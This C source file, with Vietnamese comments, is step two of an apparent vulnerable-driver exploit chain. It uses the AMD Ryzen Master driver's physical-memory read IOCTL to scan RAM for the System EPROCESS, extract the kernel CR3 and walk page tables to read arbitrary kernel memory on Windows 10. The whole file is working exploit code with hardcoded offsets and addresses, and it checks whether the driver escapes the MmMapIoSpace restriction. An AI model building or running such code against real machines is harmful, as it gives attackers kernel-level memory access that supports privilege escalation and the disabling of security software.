/*
 * step2_cr3_walk.c — CR3 via System EPROCESS scan + page walk test
 *
 * Input từ step1:
 *   ntoskrnl VA = 0xFFFFF80738400000
 *   ntoskrnl PA = 0x0000000002400000
 *
 * Step 2a: Scan physical memory 4KB pages → find System EPROCESS → CR3
 * Step 2b: Test page walk với CR3 vừa tìm được:
 *           - Walk ntoskrnl VA → PA, so sánh với PA đã biết từ step1
 *           - Walk SharedUserData VA (0xFFFFF78000000000) → PA, verify NtBuildNumber
 *           - Kết quả cho biết AMD driver có walk được page tables không
 *
 * Câu hỏi chính: AMD driver dùng MmMapIoSpace — có bị block paging pages
 * như cpuz161 không? (Win10 1803+ restriction)
 *
 * Build:
 *   cl /nologo /W3 /O2 step2_cr3_walk.c /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEVICE_NAME     L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u

/* EPROCESS offsets — Win10 21H2 (19041-19044) */
#define OFF_DTB   0x028
#define OFF_PID   0x440
#define OFF_NAME  0x5A8
#define EPROC_SZ  (OFF_NAME + 16)

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;
static HANDLE    g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────────── */
static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vname_sz, vdata_sz, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD idx=0;;idx++) {
        vname_sz=sizeof vname; vdata_sz=0;
        LONG r=RegEnumValueA(hKey,idx,vname,&vname_sz,NULL,&type,NULL,&vdata_sz);
        if(r==ERROR_NO_MORE_ITEMS) break;
        if((type!=3&&type!=8)||vdata_sz<20) continue;
        buf=(uint8_t*)malloc(vdata_sz);
        if(!buf) continue;
        if(RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vdata_sz)==ERROR_SUCCESS)
            {sz=vdata_sz;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if(!buf||sz<20){free(buf);return;}
    DWORD count=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for(DWORD i=0;i<count&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

/* ── Phys READ ───────────────────────────────────────────────────────────── */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12 + sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz);
    if(!out) return 0;
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if(ok && got>=12) memcpy(buf, out+12, sz);
    free(out);
    return ok && got>=12;
}

/* ── System EPROCESS scan → CR3 ─────────────────────────────────────────── */
static uint64_t find_system_cr3(void)
{
    uint8_t page[0x1000];
    uint8_t ep[EPROC_SZ];
    uint64_t candidates=0, last_prog=0;

    printf("  Scanning 4KB pages for System EPROCESS...\n");

    for(int ri=0; ri<g_nranges; ri++){
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for(uint64_t pa=g_ranges[ri].base; pa+0x1000<=end; pa+=0x1000){

            if(pa-last_prog >= 0x40000000ULL){
                printf("  [scan] %5llu MB  candidates=%llu\n",
                       (unsigned long long)(pa>>20),
                       (unsigned long long)candidates);
                last_prog=pa;
            }

            if(!phys_read(pa, page, sizeof page)) continue;

            for(int off=0; off+8<=0x1000; off+=8){
                /* Look for "System" at EPROCESS+OFF_NAME */
                if(memcmp(page+off, "System", 6) != 0) continue;

                uint64_t eproc_pa = pa + (uint64_t)off - OFF_NAME;
                candidates++;

                if(!pa_in_range(eproc_pa, EPROC_SZ)) continue;
                if(!phys_read(eproc_pa, ep, EPROC_SZ)) continue;

                uint64_t pid = *(uint64_t*)(ep + OFF_PID);
                if(pid != 4) continue;
                if(memcmp(ep+OFF_NAME, "System", 6) != 0) continue;

                uint64_t cr3 = *(uint64_t*)(ep + OFF_DTB);
                if(!cr3 || (cr3 & 0xFFF)) continue;

                printf("  [+] System EPROCESS PA = 0x%016llX\n",
                       (unsigned long long)eproc_pa);
                printf("  [+] CR3                = 0x%016llX\n",
                       (unsigned long long)cr3);
                return cr3;
            }
        }
    }
    printf("  [-] Not found (candidates=%llu)\n", (unsigned long long)candidates);
    return 0;
}

/* ── 4-level page walk ───────────────────────────────────────────────────── */
static uint64_t va_to_pa(uint64_t cr3, uint64_t va)
{
    uint64_t idx[4] = {(va>>39)&0x1FF,(va>>30)&0x1FF,(va>>21)&0x1FF,(va>>12)&0x1FF};
    uint64_t table = cr3 & ~0xFFFULL;
    for(int lvl=0;lvl<4;lvl++){
        uint64_t entry=0;
        /* phys_read on paging page — THIS is the key test */
        if(!phys_read(table+idx[lvl]*8, &entry, 8)){
            printf("  [walk lvl%d] phys_read FAILED @ 0x%llX\n",
                   lvl, (unsigned long long)(table+idx[lvl]*8));
            return 0;
        }
        if(!(entry&1)){
            printf("  [walk lvl%d] entry not present (0x%016llX)\n",
                   lvl, (unsigned long long)entry);
            return 0;
        }
        printf("  [walk lvl%d] table=0x%012llX idx=%llu entry=0x%016llX\n",
               lvl, (unsigned long long)table, (unsigned long long)idx[lvl],
               (unsigned long long)entry);
        if(lvl==1&&(entry&(1ULL<<7))) return (entry&~0x3FFFFFFFULL)|(va&0x3FFFFFFF);
        if(lvl==2&&(entry&(1ULL<<7))) return (entry&~0x1FFFFFULL)|(va&0x1FFFFF);
        table = entry & ~0xFFFULL;
    }
    return table|(va&0xFFF);
}

/* ═══════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    /* Hardcode từ step1 output */
    const uint64_t NT_VA = 0xFFFFF80738400000ULL;
    const uint64_t NT_PA = 0x0000000002400000ULL;

    printf("=== Step 2: CR3 from EPROCESS scan + Page Walk Test ===\n");
    printf("  ntoskrnl VA = 0x%016llX (from step1)\n", (unsigned long long)NT_VA);
    printf("  ntoskrnl PA = 0x%016llX (from step1)\n\n", (unsigned long long)NT_PA);

    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if(g_dev == INVALID_HANDLE_VALUE){
        printf("[-] Cannot open device: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Device opened\n\n");

    load_ranges();
    printf("[1] Physical ranges: %d loaded\n\n", g_nranges);

    /* Step 2a: EPROCESS scan */
    printf("[2] System EPROCESS scan → CR3:\n");
    uint64_t cr3 = find_system_cr3();
    if(!cr3){
        printf("\n[-] CR3 not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("\n");

    /* Step 2b: Page walk tests */
    printf("[3] Page walk test — CÂU HỎI QUAN TRỌNG:\n");
    printf("    AMD driver dùng MmMapIoSpace — có đọc được paging pages không?\n\n");

    /* Test A: Walk ntoskrnl VA → PA */
    printf("  Test A: ntoskrnl VA 0x%016llX\n", (unsigned long long)NT_VA);
    uint64_t walked_nt = va_to_pa(cr3, NT_VA);
    if(walked_nt){
        printf("  → PA = 0x%016llX\n", (unsigned long long)walked_nt);
        if(walked_nt == NT_PA)
            printf("  [✓] MATCH với step1 PA — WALK HOÀN TOÀN ĐÚNG!\n");
        else
            printf("  [?] Khác step1 PA (0x%llX) — verify thêm\n",
                   (unsigned long long)NT_PA);
        uint8_t probe[8]={0};
        phys_read(walked_nt, probe, 8);
        printf("  Probe: %02X %02X %02X %02X ...\n",
               probe[0],probe[1],probe[2],probe[3]);
    } else {
        printf("  → FAILED — MmMapIoSpace blocked paging pages\n");
    }
    printf("\n");

    /* Test B: Walk SharedUserData (fixed VA, good sanity check) */
    printf("  Test B: SharedUserData VA 0xFFFFF78000000000\n");
    uint64_t ssd_pa = va_to_pa(cr3, 0xFFFFF78000000000ULL);
    if(ssd_pa){
        printf("  → PA = 0x%016llX\n", (unsigned long long)ssd_pa);
        uint32_t build=0;
        phys_read(ssd_pa+0x260, &build, 4);
        uint32_t expected = *(uint32_t*)(0x7FFE0000+0x260) & 0xFFFF;
        printf("  NtBuildNumber @ PA+0x260 = 0x%X (%u)\n", build, build&0xFFFF);
        if((build&0xFFFF) == expected)
            printf("  [✓] MATCH (%u) — PAGE WALK WORKS!\n", expected);
        else
            printf("  [?] Expected %u — mismatch\n", expected);
    } else {
        printf("  → FAILED\n");
    }
    printf("\n");

    /* Test C: Walk kernel stack VA (dynamically get current KTHREAD) */
    printf("  Test C: Test với một VA tùy ý trong kernel\n");
    /* Try walking NtBuildNumber VA */
    uint64_t nb_va  = NT_VA + 0x00C12140ULL;  /* ntoskrnl VA + RVA */
    uint64_t nb_pa_expected = NT_PA + 0x00C12140ULL;
    printf("  NtBuildNumber VA = 0x%016llX\n", (unsigned long long)nb_va);
    uint64_t nb_pa_walked = va_to_pa(cr3, nb_va);
    if(nb_pa_walked){
        uint32_t val=0;
        phys_read(nb_pa_walked, &val, 4);
        printf("  → PA = 0x%016llX  value=0x%08X\n",
               (unsigned long long)nb_pa_walked, val);
        printf("  Expected PA = 0x%016llX  value=0xF0004A64\n",
               (unsigned long long)nb_pa_expected);
        if(nb_pa_walked == nb_pa_expected && val == 0xF0004A64)
            printf("  [✓] PERFECT MATCH — full VA→PA capability confirmed!\n");
    } else {
        printf("  → FAILED\n");
    }

    /* Summary */
    printf("\n=== RESULT ===\n");
    printf("ntoskrnl VA = 0x%016llX\n", (unsigned long long)NT_VA);
    printf("ntoskrnl PA = 0x%016llX\n", (unsigned long long)NT_PA);
    printf("CR3         = 0x%016llX\n", (unsigned long long)cr3);
    int walk_ok = (walked_nt != 0);
    printf("Page walk   = %s\n", walk_ok ? "WORKS ← AMD driver không bị block!"
                                          : "BLOCKED ← MmMapIoSpace restriction");
    if(walk_ok)
        printf("\nPA formula (VA→PA): dùng va_to_pa(CR3, VA)\n");
    else
        printf("\nPA formula (ntoskrnl only): PA = 0x%llX + (VA - 0x%llX)\n",
               (unsigned long long)NT_PA, (unsigned long long)NT_VA);

    CloseHandle(g_dev);
    return 0;
}
